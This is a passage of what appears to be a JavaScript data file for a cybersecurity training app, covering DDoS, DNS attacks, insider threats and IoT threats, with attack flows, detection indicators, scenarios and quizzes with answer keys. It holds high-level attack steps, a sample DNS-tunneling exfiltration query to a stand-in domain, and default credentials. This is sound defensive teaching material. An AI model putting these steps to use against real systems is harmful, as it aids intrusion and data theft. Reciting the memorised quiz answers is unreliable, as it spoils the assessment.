            { question: 'Which cloud security measure BEST prevents cryptojacking in cloud environments?', options: ['Using only on-premises servers', 'Enforcing authentication and resource quotas with billing alerts', 'Disabling all container services', 'Using only Windows-based cloud instances'], correct: 1, explanation: 'Proper authentication prevents unauthorized access, resource quotas limit mining impact, and billing alerts catch unusual compute spending early.' }
        ]
    },

    // =================================================================
    // 5. DDoS (DISTRIBUTED DENIAL OF SERVICE)
    // =================================================================
    DDOS: {
        code: 'DDOS',
        title: 'DDoS Attacks',
        icon: '\u{1F30A}',
        severity: 'high',
        color: '#a855f7',
        description: 'Attacks that overwhelm a target with traffic from multiple distributed sources, making services unavailable to legitimate users.',
        overview: {
            what: 'A Distributed Denial of Service (DDoS) attack floods a target server, service, or network with traffic from many compromised systems (often a botnet) to exhaust resources and make the target unavailable to legitimate users. DDoS attacks can target network bandwidth (volumetric), server resources (protocol), or application logic (application-layer).',
            keyPoints: [
                'Three categories: Volumetric (bandwidth flood), Protocol (SYN/ACK floods), Application-layer (HTTP floods)',
                'Amplification attacks abuse protocols like DNS, NTP, and Memcached to multiply traffic',
                'DDoS-for-hire services (booters/stressers) make attacks accessible to anyone',
                'Multi-vector attacks combine multiple techniques simultaneously',
                'Cost of downtime for enterprises averages $5,600 per minute'
            ],
            examples: [
                { name: 'GitHub DDoS (2018)', detail: 'Memcached amplification attack peaked at 1.35 Tbps — the largest DDoS at the time. GitHub was offline for ~10 minutes before Akamai scrubbed the traffic.' },
                { name: 'AWS Shield DDoS (2020)', detail: 'AWS reported mitigating a 2.3 Tbps DDoS attack — the largest volumetric attack ever recorded at the time.' },
                { name: 'Dyn DNS Attack (2016)', detail: 'Mirai botnet launched massive DDoS against DNS provider Dyn, knocking Twitter, Netflix, Reddit, and Spotify offline for hours.' }
            ],
            stats: [
                { label: 'Largest recorded', value: '5.6 Tbps', note: 'Cloudflare Q4 2024' },
                { label: 'Avg. attack duration', value: '~50 min', note: 'Cloudflare 2024 report' },
                { label: 'Attacks per day', value: '~23,000', note: 'NETSCOUT global estimate' }
            ]
        },
        attackFlow: {
            title: 'DDoS Attack Flow',
            steps: [
                { phase: 'Target Selection', description: 'Attacker identifies the target and its infrastructure — IP ranges, DNS providers, CDN usage, and hosting environment.', icon: '\u{1F3AF}' },
                { phase: 'Botnet Assembly', description: 'Recruits attack sources: compromises IoT devices for a botnet, rents a DDoS-for-hire service, or identifies open resolvers for amplification.', icon: '\u{1F916}' },
                { phase: 'Attack Vector Selection', description: 'Chooses attack type: volumetric (UDP flood, DNS amplification), protocol (SYN flood, Ping of Death), or application-layer (HTTP GET/POST flood, Slowloris).', icon: '\u{1F9E0}' },
                { phase: 'Attack Launch', description: 'Coordinates all attack sources to simultaneously flood the target. Spoofed source IPs and amplification multiply the effective volume.', icon: '\u{1F680}' },
                { phase: 'Resource Exhaustion', description: 'Target\'s bandwidth, CPU, memory, or connection tables are overwhelmed. Legitimate users receive timeouts or connection refused errors.', icon: '\u{1F4A5}' },
                { phase: 'Sustain & Adapt', description: 'Attacker monitors the target\'s response, shifts attack vectors if mitigations activate, and may demand ransom to stop (RDDoS).', icon: '\u{1F504}' }
            ]
        },
        defense: {
            detection: [
                'Real-time traffic analysis for volume anomalies and traffic pattern changes',
                'NetFlow/sFlow monitoring for unusual source diversity or protocol distribution',
                'Baseline comparison — alert when traffic exceeds normal thresholds',
                'Geographic anomaly detection for traffic from unexpected regions',
                'Application performance monitoring for latency spikes'
            ],
            prevention: [
                'DDoS mitigation services (Cloudflare, AWS Shield, Akamai Prolexic)',
                'Rate limiting and connection throttling at load balancers',
                'Anycast network distribution to absorb and distribute attack traffic',
                'BCP38/RFC 2827 implementation to prevent IP spoofing at the ISP level',
                'Over-provisioned bandwidth and redundant infrastructure'
            ],
            response: [
                'Activate DDoS mitigation service and reroute traffic through scrubbing centers',
                'Enable rate limiting and geo-blocking for attack source regions',
                'Communicate with ISP upstream for traffic blackholing of attack sources',
                'Switch to backup infrastructure or CDN failover if primary is saturated',
                'Document attack vectors for post-incident analysis and improved defenses'
            ]
        },
        indicators: {
            network: [
                'Sudden massive spike in inbound traffic volume (10x-1000x normal baseline)',
                'High volume of SYN packets without completing TCP handshakes (SYN flood)',
                'Traffic from a large number of geographically diverse source IPs simultaneously',
                'Amplified responses from DNS, NTP, or Memcached reflectors targeting your IP',
                'Abnormal protocol distribution (e.g., 95% UDP when baseline is 20%)'
            ],
            host: [
                'Web server connection table saturation (too many open/half-open connections)',
                'CPU and memory exhaustion on load balancers and firewalls',
                'HTTP 503 Service Unavailable errors spiking in access logs',
                'Application-layer slowdown: increasing response times before full outage',
                'Connection timeouts reported across multiple services simultaneously'
            ],
            behavioral: [
                'Customer complaints about website unavailability or extreme slowness',
                'Monitoring systems showing latency spikes across multiple data centers',
                'Ransom demand received via email threatening DDoS (RDDoS indicator)',
                'Attack intensity shifting between vectors (volumetric, then application-layer)',
                'Traffic patterns showing botnet characteristics: similar User-Agent strings, identical request patterns'
            ],
            tools: ['Cloudflare / AWS Shield / Akamai (DDoS mitigation)', 'NetFlow Analyzer', 'Fastnetmon (real-time DDoS detection)', 'Arbor Networks', 'Wireshark (packet analysis)', 'LOIC/HOIC detection signatures', 'BGP blackhole routing', 'Rate limiting at load balancer']
        },
        interactive: {
            scenario: 'Your e-commerce website goes down during a major sales event. Monitoring shows inbound traffic has spiked from 500 Mbps to 45 Gbps in 3 minutes. The traffic is primarily DNS response packets (large TXT records) from thousands of open DNS resolvers worldwide — but your servers never sent those DNS queries. Your ISP reports the traffic is overwhelming their upstream link to your data center. What type of DDoS is this and what is your best response?',
            options: [
                'Application-layer HTTP flood — enable rate limiting on the web server',
                'DNS amplification/reflection attack — activate your DDoS mitigation service to scrub traffic before it reaches your network, contact your ISP for upstream filtering, and later implement BCP38',
                'Your DNS server is misconfigured and generating excessive responses — restart the DNS service',
                'SYN flood attack — increase the TCP backlog queue on your servers'
            ],
            correct: 1,
            explanation: 'This is a DNS amplification attack: attackers send small DNS queries with your spoofed source IP to open resolvers, which respond with much larger DNS replies (amplification factor of 28-54x) that flood your network. The key indicator is receiving DNS responses you never requested. Your immediate response should be activating a DDoS mitigation/scrubbing service (Cloudflare, Akamai, AWS Shield) that can absorb and filter the traffic upstream. ISP-level filtering provides additional protection. BCP38 at ISP level prevents the IP spoofing that enables these attacks.'
        },
        quiz: [
            { question: 'What is the difference between a DoS and a DDoS attack?', options: ['DoS is more powerful than DDoS', 'DDoS uses multiple distributed sources, DoS uses a single source', 'DoS targets applications, DDoS targets networks', 'There is no difference'], correct: 1, explanation: 'A DoS (Denial of Service) comes from a single source, while a DDoS (Distributed DoS) uses many compromised systems to attack simultaneously, making it much harder to block.' },
            { question: 'In a DNS amplification attack, why is the amplification factor so high?', options: ['DNS servers are inherently insecure', 'A small query generates a much larger response, and the response is sent to the spoofed victim IP', 'DNS uses TCP which allows larger packets', 'DNS amplification only works on IPv6'], correct: 1, explanation: 'A DNS query can be as small as ~60 bytes but produce a response of ~3,000+ bytes (50x amplification). Using spoofed source IPs, the large responses flood the victim, not the attacker.' },
            { question: 'What type of DDoS attack is Slowloris?', options: ['Volumetric attack', 'Protocol attack', 'Application-layer attack that keeps connections open with partial requests', 'DNS amplification attack'], correct: 2, explanation: 'Slowloris is an application-layer attack that sends partial HTTP requests, keeping many connections open simultaneously to exhaust the web server\'s connection pool with minimal bandwidth.' },
            { question: 'What is Ransom DDoS (RDDoS)?', options: ['A DDoS attack that encrypts the target\'s data', 'An attack where the attacker demands payment to stop or prevent a DDoS attack', 'A DDoS attack against cryptocurrency exchanges', 'A type of ransomware that uses DDoS as a delivery mechanism'], correct: 1, explanation: 'RDDoS involves attackers threatening or launching DDoS attacks and demanding cryptocurrency payment to stop. Sometimes the threat alone (without actual capability) is used for extortion.' },
            { question: 'Which mitigation technique distributes traffic across multiple global data centers to absorb DDoS attacks?', options: ['IP blacklisting', 'Anycast routing', 'Port blocking', 'Deep packet inspection'], correct: 1, explanation: 'Anycast assigns the same IP address to servers in multiple locations. Traffic is routed to the nearest server, distributing the attack load across the entire network instead of hitting one point.' },
            { question: 'The 2016 Dyn DNS attack demonstrated what critical vulnerability in internet infrastructure?', options: ['DNS itself has unfixable protocol flaws', 'Concentration of services behind single DNS providers creates cascading failure points', 'IPv4 is inherently vulnerable to DDoS', 'Cloud hosting is less secure than on-premises'], correct: 1, explanation: 'When Dyn went down, hundreds of major sites became unreachable — highlighting the risk of depending on a single DNS provider and the need for DNS redundancy.' }
        ]
    },

    // =================================================================
    // 6. DNS ATTACKS
    // =================================================================
    DNS_ATTACKS: {
        code: 'DNS_ATTACKS',
        title: 'DNS Attacks',
        icon: '\u{1F310}',
        severity: 'high',
        color: '#a855f7',
        description: 'Attacks that exploit the Domain Name System through poisoning, tunneling, hijacking, and spoofing to redirect, intercept, or exfiltrate data.',
        overview: {
            what: 'DNS attacks exploit the Domain Name System — the internet\'s address book that translates domain names to IP addresses. Because DNS was designed without built-in security, attackers can poison DNS caches to redirect users to malicious sites, tunnel data through DNS queries to bypass firewalls, or hijack domains to steal traffic. DNS is critical infrastructure — compromising it affects all services.',
            keyPoints: [
                'DNS Cache Poisoning: Inserts false records to redirect traffic',
                'DNS Tunneling: Encodes data in DNS queries to exfiltrate data or bypass firewalls',
                'DNS Hijacking: Changes DNS settings at registrar, router, or host level',
                'DNS Spoofing: Forges DNS responses to redirect victims',
                'DNSSEC adds cryptographic signatures but adoption remains limited (~30%)'
            ],
            examples: [
                { name: 'Kaminsky Attack (2008)', detail: 'Dan Kaminsky discovered a fundamental DNS cache poisoning flaw affecting virtually all DNS software. Coordinated global patching effort before public disclosure.' },
                { name: 'Sea Turtle (2019)', detail: 'Nation-state DNS hijacking campaign redirected DNS for 40+ organizations across 13 countries by compromising DNS registrars and registries.' },
                { name: 'DNSpionage (2018-2019)', detail: 'Iranian-linked campaign that hijacked DNS records of Middle Eastern government agencies and airlines to intercept credentials via fake login pages.' }
            ],
            stats: [
                { label: 'Organizations attacked', value: '88%', note: 'experienced DNS attacks (IDC 2023)' },
                { label: 'Avg. cost per DNS attack', value: '$1.1M', note: 'IDC Global DNS Threat Report' },
                { label: 'DNS tunneling traffic', value: '46%', note: 'increase year over year (Palo Alto)' }
            ]
        },
        attackFlow: {
            title: 'DNS Attack Lifecycle (Cache Poisoning)',
            steps: [
                { phase: 'Target Identification', description: 'Attacker identifies a DNS resolver serving many clients and the target domain to poison (e.g., a banking site).', icon: '\u{1F50D}' },
                { phase: 'Query Trigger', description: 'Forces the target resolver to query for the victim domain by sending a request or waiting for cache expiry, causing the resolver to query authoritative servers.', icon: '\u{1F4E8}' },
                { phase: 'Race Condition', description: 'Floods the resolver with forged DNS responses containing the malicious IP address, attempting to arrive before the legitimate response.', icon: '\u{1F3C3}' },
                { phase: 'Cache Poisoning', description: 'If the forged response is accepted (matching transaction ID and source port), the malicious record is cached and served to all clients.', icon: '\u{2620}' },
                { phase: 'Victim Redirection', description: 'Users querying the poisoned resolver receive the attacker\'s IP. They connect to a malicious server that mimics the real site to steal credentials.', icon: '\u{1F517}' },
                { phase: 'Credential Harvest', description: 'Victims enter credentials on the fake site, which are captured and may be replayed against the real service.', icon: '\u{1F513}' }
            ]
        },
        defense: {
            detection: [
                'Monitor DNS query volumes and patterns for tunneling indicators (high TXT/NULL record queries)',
                'Analyze DNS query entropy — tunneled data creates abnormally long subdomain labels',
                'Track DNS record changes and TTL anomalies for poisoning attempts',
                'SIEM alerts for DNS queries to known malicious or newly registered domains',
                'Compare DNS responses from multiple resolvers to detect inconsistencies'
            ],
            prevention: [
                'Implement DNSSEC to cryptographically validate DNS responses',
                'Use DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT) to prevent interception',
                'Configure DNS resolvers with source port randomization and 0x20 encoding',
                'Registry lock (clientTransferProhibited, serverTransferProhibited) on critical domains',
                'Multi-factor authentication on domain registrar accounts'
            ],
            response: [
                'Flush DNS caches on affected resolvers and clients immediately',
                'Verify domain registration and DNS records at registrar level',
                'Switch to trusted DNS resolvers (Quad9, Cloudflare, Google) temporarily',
                'Analyze DNS logs to determine scope and duration of the attack',
                'Notify affected users if credentials may have been captured'
            ]
        },
        indicators: {
            network: [
                'Abnormally long DNS subdomain labels (>50 characters indicates possible tunneling)',
                'High volume of TXT, NULL, or CNAME record queries from a single host',
                'DNS query entropy analysis showing encoded/encrypted data in subdomain strings',
                'Responses from DNS servers with unexpected or changed record values (poisoning)',
                'DNS queries to newly registered domains or domains with high DGA-like entropy'
            ],
            host: [
                'Modified DNS resolver settings on endpoints (pointing to rogue DNS servers)',
                'Changes to /etc/resolv.conf or Windows DNS client settings without authorization',
                'Local hosts file modifications redirecting legitimate domains to malicious IPs',
                'DNS client cache containing entries with unusually short or long TTL values',
                'Browser certificate errors when accessing previously trusted sites (redirect indicator)'
            ],
            behavioral: [
                'Users reporting being redirected to unfamiliar login pages for known services',
                'DNS query volume from a single endpoint far exceeding normal patterns',
                'Registrar account activity alerts: unauthorized DNS record changes',
                'Inconsistent DNS responses when querying the same domain from different resolvers',
                'Sudden increase in DNS query failures or NXDOMAIN responses'
            ],
            tools: ['DNSRecon', 'Passive DNS databases (Farsight DNSDB)', 'Zeek DNS logging', 'DNS Analytics (Splunk/Elastic)', 'DNSSEC validation tools', 'DNStap', 'Iodine (tunneling detection baseline)', 'Quad9 / Cloudflare threat feeds']
        },
        interactive: {
            scenario: 'Your SOC analyst notices a single workstation generating 15,000 DNS queries per hour — 50x the normal rate. The queries are all to subdomains of a single .info domain, and each subdomain label is a random-looking string of 60+ hexadecimal characters (e.g., 4a6f686e446f6553656e73697469766544617461.exfil-data.info). The domain was registered 48 hours ago. What is happening?',
            options: [
                'The workstation has a misconfigured application generating excessive DNS lookups',
                'This is DNS tunneling — malware on the workstation is encoding and exfiltrating data through DNS queries to an attacker-controlled domain',
                'The user is visiting a website with many subdomains that require DNS resolution',
                'The DNS resolver is experiencing a cache corruption issue and re-querying domains'
            ],
            correct: 1,
            explanation: 'This is textbook DNS tunneling. The indicators are unmistakable: (1) extreme query volume from a single host, (2) long hexadecimal subdomain labels (the hex string "4a6f686e446f65..." decodes to ASCII text — it IS the exfiltrated data), (3) all queries to one recently registered domain (the attacker\'s C2), (4) 60+ character labels (normal subdomains are much shorter). The malware is encoding stolen data as hex in DNS queries, sending it to the attacker\'s authoritative DNS server which decodes and collects it. This bypasses most firewalls since DNS traffic is typically allowed.'
        },
        quiz: [
            { question: 'How does DNS cache poisoning redirect victims to malicious sites?', options: ['By modifying the victim\'s hosts file', 'By inserting false records into a DNS resolver\'s cache so it returns the attacker\'s IP', 'By blocking all DNS traffic', 'By changing the domain registration records directly'], correct: 1, explanation: 'Cache poisoning injects false DNS records into a resolver\'s cache. All clients using that resolver then receive the attacker\'s IP when querying the poisoned domain.' },
            { question: 'What is DNS tunneling primarily used for by attackers?', options: ['Speeding up DNS resolution', 'Encoding data in DNS queries to exfiltrate data or bypass firewalls', 'Encrypting DNS traffic for privacy', 'Distributing DNS load across servers'], correct: 1, explanation: 'DNS tunneling encodes arbitrary data within DNS queries and responses. Since DNS traffic is often allowed through firewalls unchecked, it provides a covert channel for data exfiltration or C2 communication.' },
            { question: 'What does DNSSEC protect against?', options: ['DNS tunneling', 'DNS cache poisoning by cryptographically signing DNS records', 'DDoS attacks against DNS servers', 'All DNS-based attacks'], correct: 1, explanation: 'DNSSEC adds digital signatures to DNS records, allowing resolvers to verify that responses are authentic and haven\'t been tampered with — directly preventing cache poisoning.' },
            { question: 'How can DNS tunneling be detected?', options: ['By checking SSL certificates', 'By analyzing query patterns for unusually long subdomain labels and high volumes of TXT records', 'By enabling DNSSEC', 'By using a VPN'], correct: 1, explanation: 'DNS tunneling creates abnormal patterns: very long subdomain labels (encoded data), high query volumes, and unusual record types (TXT, NULL). Entropy analysis of subdomain strings is a strong indicator.' },
            { question: 'In the Sea Turtle campaign, how did attackers hijack DNS?', options: ['Exploiting DNS protocol vulnerabilities', 'Compromising domain registrars and DNS registries directly', 'Deploying rogue DNS servers', 'Cache poisoning at ISP level'], correct: 1, explanation: 'Sea Turtle targeted the DNS infrastructure itself — compromising registrars and registries to modify DNS records at the authoritative level, bypassing all resolver-level protections.' },
            { question: 'What is DNS-over-HTTPS (DoH)?', options: ['A faster DNS protocol', 'DNS queries encrypted and sent over HTTPS to prevent eavesdropping and manipulation', 'A way to host websites on DNS servers', 'A replacement for DNSSEC'], correct: 1, explanation: 'DNS-over-HTTPS encrypts DNS queries within HTTPS connections, preventing ISPs and attackers from seeing or modifying DNS traffic. It complements (doesn\'t replace) DNSSEC.' }
        ]
    },

    // =================================================================
    // 7. INSIDER THREATS
    // =================================================================
    INSIDER_THREATS: {
        code: 'INSIDER_THREATS',
        title: 'Insider Threats',
        icon: '\u{1F464}',
        severity: 'high',
        color: '#a855f7',
        description: 'Security risks originating from within the organization — employees, contractors, or partners who misuse authorized access to harm the organization.',
        overview: {
            what: 'An insider threat is a security risk from someone within the organization who has authorized access to systems, data, or facilities. Insiders can be malicious (intentionally stealing data or sabotaging systems), negligent (accidentally causing breaches through carelessness), or compromised (credentials stolen by external attackers). Because insiders already have legitimate access, they bypass many perimeter defenses.',
            keyPoints: [
                'Three types: Malicious (intentional), Negligent (accidental), Compromised (stolen credentials)',
                'Insiders cause ~60% of data breaches (either directly or through negligence)',
                'Hardest threat to detect because the attacker IS a trusted user',
                'Common motivations: financial gain, revenge, ideology, coercion',
                'Average insider incident costs $15.4 million (DTEX/Ponemon 2023)'
            ],
            examples: [
                { name: 'Edward Snowden (2013)', detail: 'NSA contractor exfiltrated 1.5 million classified documents, exposing global surveillance programs. Used system admin access to bypass normal compartmentalization.' },
                { name: 'Tesla Sabotage (2018)', detail: 'A disgruntled employee modified Tesla\'s Manufacturing Operating System code and exported proprietary data to third parties, claiming whistleblower motivation.' },
                { name: 'Capital One Breach (2019)', detail: 'Former AWS employee exploited a misconfigured WAF to access 100M+ Capital One customer records — an example of a compromised/malicious insider with cloud expertise.' }
            ],
            stats: [
                { label: 'Avg. cost per incident', value: '$15.4M', note: 'DTEX/Ponemon 2023' },
                { label: 'Time to detect', value: '85 days', note: 'average containment time' },
                { label: 'Insider-caused breaches', value: '~60%', note: 'Verizon DBIR 2024' }
            ]
        },
        attackFlow: {
            title: 'Insider Threat Progression',
            steps: [
                { phase: 'Trigger Event', description: 'A precipitating event motivates the insider: passed over for promotion, financial pressure, ideological shift, or recruitment by external actor. Compromised insiders may be unaware.', icon: '\u{26A0}' },
                { phase: 'Reconnaissance', description: 'Insider explores their access boundaries, identifies valuable data assets, and maps systems they can reach. They note security controls and monitoring gaps.', icon: '\u{1F441}' },
                { phase: 'Circumvention', description: 'Uses legitimate credentials to access data, but may escalate privileges, disable logging, or create unauthorized accounts for future access.', icon: '\u{1F511}' },
                { phase: 'Data Collection', description: 'Gathers targeted data: downloads files, takes screenshots, copies databases, or photographs screens. May accumulate data slowly to avoid thresholds.', icon: '\u{1F4C1}' },
                { phase: 'Exfiltration', description: 'Moves data outside the organization via USB drives, personal email, cloud storage, printed documents, or encrypted channels that bypass DLP.', icon: '\u{1F4E4}' },
                { phase: 'Cover-up', description: 'Deletes access logs, modifies timestamps, removes evidence of file access, and may plant false trails to misdirect investigators.', icon: '\u{1F9F9}' }
            ]
        },
        defense: {
            detection: [
                'User and Entity Behavior Analytics (UEBA) to baseline and detect anomalous access patterns',
                'Data Loss Prevention (DLP) monitoring for bulk file downloads or transfers',
                'Privileged Access Monitoring (PAM) with session recording for admin accounts',
                'Anomalous login detection: unusual times, locations, or concurrent sessions',
                'Database Activity Monitoring (DAM) for unusual query patterns'
            ],
            prevention: [
                'Principle of Least Privilege — restrict access to only what\'s needed for job function',
                'Mandatory background checks and continuous evaluation for sensitive positions',
                'Security awareness training emphasizing insider threat indicators',
                'Separation of duties for critical operations (no single person can complete)',
                'Robust offboarding procedures: immediate credential revocation upon departure'
            ],
            response: [
                'Activate insider threat investigation team (legal, HR, IT, security)',
                'Preserve evidence with forensically sound collection procedures',
                'Restrict the insider\'s access without alerting them (if investigation ongoing)',
                'Interview witnesses and review access logs, email, and file activity',
                'Coordinate with law enforcement if criminal activity is suspected'
            ]
        },
        indicators: {
            network: [
                'Large file uploads to personal cloud storage (Google Drive, Dropbox, OneDrive personal)',
                'Email forwarding rules sending copies of messages to external addresses',
                'VPN connections from unusual geographic locations or at atypical times',
                'Bulk data downloads from file servers or SharePoint sites',
                'USB mass storage device connections on endpoints with DLP alerts'
            ],
            host: [
                'Printing unusually large volumes of documents, especially classified or sensitive materials',
                'Screenshots or screen recording software installed without business justification',
                'Unauthorized software installed for data archiving or encryption',
                'Access to files or directories outside normal job scope appearing in audit logs',
                'Attempts to disable endpoint monitoring or security agents'
            ],
            behavioral: [
                'Employee recently passed over for promotion, given negative performance review, or under investigation',
                'Working unusual hours without clear business need, especially after resignation notice',
                'Requesting access to systems or data not required for current role',
                'Expressing dissatisfaction, grievances, or sympathy for adversarial organizations',
                'Unexplained changes in financial situation (sudden wealth or sudden financial stress)'
            ],
            tools: ['UEBA platforms (Exabeam, Securonix)', 'DLP solutions (Symantec, Digital Guardian)', 'PAM session recording (CyberArk, BeyondTrust)', 'Database Activity Monitoring', 'Microsoft Insider Risk Management', 'Endpoint telemetry (CrowdStrike, SentinelOne)', 'SIEM behavioral baselines', 'Physical access badge logs']
        },
        interactive: {
            scenario: 'An HR manager informs your security team that a senior database administrator submitted their 2-week resignation notice this morning. The DBA has access to customer PII, financial records, and system credentials. Your UEBA system shows the DBA downloaded 3.2 GB of database exports yesterday — 10x their normal daily data access — and connected to the corporate VPN at 11:30 PM last night for 45 minutes. What is your recommended course of action?',
            options: [
                'Do nothing until the DBA leaves — they are still a trusted employee',
                'Immediately terminate all the DBA\'s access and escort them from the building',
                'Implement enhanced monitoring, restrict access to only current project needs, preserve forensic evidence of the 3.2 GB download, and coordinate with HR and legal on the investigation',
                'Send the DBA an email reminding them of their NDA obligations'
            ],
            correct: 2,
            explanation: 'The timing is critical: a large data download the day BEFORE submitting resignation is a major red flag — it suggests pre-planned exfiltration. However, immediately terminating all access without investigation may destroy evidence and create legal complications. The balanced approach: (1) implement enhanced monitoring to catch further exfiltration, (2) restrict access to only what their current projects require, (3) forensically preserve evidence of the download and late-night VPN session, and (4) coordinate with HR and legal. This preserves evidence, limits further damage, and maintains legal standing.'
        },
        quiz: [
            { question: 'Which type of insider threat is MOST common?', options: ['Malicious insiders seeking financial gain', 'Negligent insiders who accidentally cause breaches', 'State-sponsored moles', 'Disgruntled former employees'], correct: 1, explanation: 'Negligent insiders (careless employees who fall for phishing, misconfigure systems, or mishandle data) cause the majority of insider incidents — far more than intentional malicious actions.' },
            { question: 'Why are insider threats particularly difficult to detect?', options: ['Insiders use more sophisticated tools than external attackers', 'Insiders have legitimate access, making their actions appear normal', 'Security tools cannot monitor internal users', 'Insiders always disable security software first'], correct: 1, explanation: 'The fundamental challenge is that insider activity looks like authorized use — the same credentials, same systems, same data. Distinguishing malicious intent from normal work requires behavioral analysis.' },
            { question: 'An employee who was recently denied a promotion starts downloading large volumes of customer data. What type of indicator is this?', options: ['Technical indicator only', 'Behavioral indicator combining a trigger event with anomalous data access', 'Normal business activity', 'Network indicator'], correct: 1, explanation: 'Insider threat detection works best when correlating behavioral indicators (denied promotion = trigger event) with technical indicators (unusual data downloads). Neither alone is conclusive.' },
            { question: 'What security control BEST prevents a departing employee from causing damage?', options: ['Exit interview', 'Immediate credential revocation and access removal upon termination notice', 'Sending a reminder email about NDAs', 'Allowing a 30-day transition period'], correct: 1, explanation: 'Immediate credential revocation when an employee gives notice (or is terminated) prevents them from accessing systems to steal data or plant logic bombs.' },
            { question: 'Which tool is specifically designed to detect insider threats by baselining normal user behavior?', options: ['Antivirus software', 'User and Entity Behavior Analytics (UEBA)', 'Web Application Firewall (WAF)', 'Intrusion Detection System (IDS)'], correct: 1, explanation: 'UEBA establishes baseline patterns for each user (login times, data access volume, systems used) and flags deviations that could indicate insider threat activity.' }
        ]
    },

    // =================================================================
    // 8. IoT THREATS
    // =================================================================
    IOT_THREATS: {
        code: 'IOT_THREATS',
        title: 'IoT Threats',
        icon: '\u{1F4F1}',
        severity: 'high',
        color: '#a855f7',
        description: 'Security vulnerabilities and attacks targeting Internet of Things devices — smart cameras, industrial sensors, medical devices, and connected appliances.',
        overview: {
            what: 'IoT (Internet of Things) threats exploit the security weaknesses inherent in billions of connected devices — from smart home cameras and thermostats to industrial control systems and medical devices. These devices often ship with default credentials, lack update mechanisms, run minimal operating systems, and have long lifecycles without patches, making them attractive targets for botnet recruitment, data theft, and as pivot points into corporate networks.',
            keyPoints: [
                'Over 15 billion IoT devices globally (projected 30B+ by 2030)',
                'Common issues: default credentials, unencrypted communications, no update mechanism',
                'IoT devices serve as entry points into otherwise secure networks',
                'Industrial IoT (IIoT) attacks can cause physical damage or safety hazards',
                'Medical IoT vulnerabilities can be life-threatening (pacemakers, insulin pumps)'
            ],
            examples: [
                { name: 'Mirai Botnet (2016)', detail: 'Exploited default credentials on IoT cameras and routers to build a botnet of 600K+ devices, launching the Dyn DNS attack that disrupted major internet services.' },
                { name: 'Verkada Camera Hack (2021)', detail: 'Attackers accessed 150,000 surveillance cameras at hospitals, prisons, Tesla, and Cloudflare by finding hardcoded admin credentials in the Verkada firmware.' },
                { name: 'Triton/TRISIS (2017)', detail: 'Malware targeting Schneider Electric Triconex safety controllers in a Saudi petrochemical plant — designed to disable industrial safety systems that prevent explosions.' }
            ],
            stats: [
                { label: 'IoT attacks in 2023', value: '77.9M', note: 'SonicWall Cyber Threat Report' },
                { label: 'Vulnerable IoT devices', value: '57%', note: 'have critical vulnerabilities (Palo Alto)' },
                { label: 'Default credential usage', value: '15%', note: 'of IoT devices still use defaults (Rapid7)' }
            ]
        },
        attackFlow: {
            title: 'IoT Attack Lifecycle',
            steps: [
                { phase: 'Device Discovery', description: 'Attacker scans networks using Shodan, Censys, or custom scanners to find exposed IoT devices — cameras, routers, PLCs, printers, and smart appliances.', icon: '\u{1F50D}' },
                { phase: 'Vulnerability Assessment', description: 'Tests discovered devices for default credentials, known CVEs, unencrypted protocols (Telnet, FTP, MQTT without TLS), and firmware vulnerabilities.', icon: '\u{1F4CB}' },
                { phase: 'Initial Compromise', description: 'Gains access via default credentials (admin/admin), known exploits, or brute force. Many IoT devices have no lockout mechanism.', icon: '\u{1F513}' },
                { phase: 'Malware Deployment', description: 'Installs lightweight malware designed for the device\'s architecture (ARM, MIPS). Mirai-variant bots are ~100KB and run on minimal Linux systems.', icon: '\u{1F41B}' },
                { phase: 'Lateral Movement', description: 'Uses the compromised IoT device as a pivot point into the corporate network, scanning for additional devices and more valuable targets.', icon: '\u{27A1}' },
                { phase: 'Mission Execution', description: 'Recruits device into botnet, uses it for DDoS, mines cryptocurrency, exfiltrates data from network, or (for IIoT) disrupts physical processes.', icon: '\u{1F4A3}' }
            ]
        },
        defense: {
            detection: [
                'Network monitoring for IoT devices communicating with unusual external IPs',
                'Automated asset discovery to maintain IoT device inventory',
                'Behavioral analysis for IoT devices generating unexpected traffic patterns',
                'Firmware integrity monitoring to detect unauthorized modifications',
                'Monitoring IoT-specific protocols (MQTT, CoAP, Zigbee) for anomalies'
            ],
            prevention: [
                'Change all default credentials before deploying IoT devices',
                'Network segmentation — isolate IoT devices in separate VLANs',
                'Regular firmware updates (prefer devices with auto-update capability)',
                'Disable unnecessary services and ports (Telnet, UPnP, SSH if unused)',
                'Require IoT vendors to provide security certifications and update commitments'
            ],
            response: [
                'Isolate compromised IoT devices immediately (disable network access)',
                'Factory reset and re-provision with hardened configuration',
                'Audit all IoT devices on the network for similar vulnerabilities',
                'Review network logs for lateral movement originating from IoT segment',
                'Update network segmentation rules based on lessons learned'
            ]
        },
        indicators: {
            network: [
                'IoT devices making outbound connections to external IPs not associated with the vendor',
                'Telnet (port 23) or SSH brute force attempts originating from IoT device IPs',
                'Unusual traffic volumes from devices that normally generate minimal network activity',
                'MQTT or CoAP traffic without TLS encryption on the network',
                'Scanning activity (SYN scans, port sweeps) originating from IoT VLAN'
            ],
            host: [
                'Firmware checksum mismatches when compared to vendor-published values',
                'Default credentials still active on deployed devices (admin/admin, root/root)',
                'Unexpected processes running on IoT devices detected via firmware analysis',
                'Device configuration changes without corresponding change management tickets',
                'IoT devices responding to Shodan/Censys scans on the public internet'
            ],
            behavioral: [
                'Smart cameras, thermostats, or sensors generating traffic at 3:00 AM when the building is empty',
                'New IoT devices appearing on the network without procurement records',
                'Devices rebooting frequently (possible firmware update attempts by attackers)',
                'Single IoT device suddenly communicating with dozens of other internal devices',
                'IoT devices attempting DNS resolution for cryptocurrency mining pools'
            ],
            tools: ['Shodan / Censys (exposure scanning)', 'Nmap (device discovery)', 'Firmwalker (firmware analysis)', 'Binwalk (firmware extraction)', 'Wireshark (protocol analysis)', 'IoT Inspector', 'Forescout (device visibility)', 'Cisco ISE (network access control)']
        },
        interactive: {
            scenario: 'During a routine network scan, you discover that the smart HVAC controllers in your office building are accessible via Telnet (port 23) with the default manufacturer credentials (admin/admin). These controllers are on the same VLAN as your corporate file servers and Active Directory domain controllers. A Shodan search reveals these controllers are also visible from the internet through a misconfigured firewall rule. What is the priority order of remediation?',
            options: [
                'Change the passwords first, then segment the network later when budget allows',
                'Block Shodan from scanning your network and the problem is solved',
                'Immediately close the external firewall rule, then segment IoT devices into a dedicated VLAN, change all default credentials, disable Telnet, and audit for any signs of prior compromise',
                'Replace all HVAC controllers with newer models that have better security'
            ],
            correct: 2,
